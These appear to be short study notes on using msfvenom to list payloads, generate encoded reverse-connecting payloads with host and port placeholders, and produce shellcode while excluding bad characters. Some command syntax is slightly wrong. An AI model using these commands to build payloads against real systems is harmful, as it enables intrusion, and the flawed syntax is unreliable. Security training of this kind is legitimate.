````bash
msfvenom -l payloads
````

1. <u>Generate Encoded Payload</u>

````bash
msfvenom -p <payload> LHOST=<ip-address> LPORT=<port> -e <encoder-name> -i <iterations> f <file-format> <filename>
````

**<u>Flags</u>**:  
-a : Architecture  
--platform : Supported Platforms  
-o : Output File

2. <u>Generating Shell Code</u>

````bash
msfvenom -p <payload> LHOST=<ip-address> LPORT=<port> -f c
msfvenom -p <payload> LHOST=<ip-address> LPORT=<port> -f c -e <encoder> -b "x00"
````

Bad Characters that can cause the Shell Code to terminate midway (Unsupported Characters) so they need to be encoded  
x86shikata_ga_nai (Popular Encoder)
